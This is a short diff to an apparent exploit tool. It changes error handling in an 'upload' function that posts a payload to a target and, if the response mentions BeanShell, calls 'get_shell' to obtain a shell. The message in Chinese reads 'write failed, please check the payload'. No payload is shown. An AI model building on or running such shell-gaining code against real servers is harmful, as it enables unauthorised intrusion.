@@ -29,10 +29,13 @@ def upload(url, path, name):
         "Content-Type": "application/x-www-form-urlencoded"
     }
     r = core.post(url, path, header, data)
-    if r.status_code == 200 and "BeanShell" in r.text:
-        get_shell(url, shell_name, name)
+    if r:
+        if r.status_code == 200 and "BeanShell" in r.text:
+            get_shell(url, shell_name, name)
+        else:
+            print('\033[32m[#]写入失败,请检查payload\033[0m')
+            core.end_echo(name)
     else:
-        print('\033[32m[#]写入失败,请检查payload\033[0m')
         core.end_echo(name)
 
 
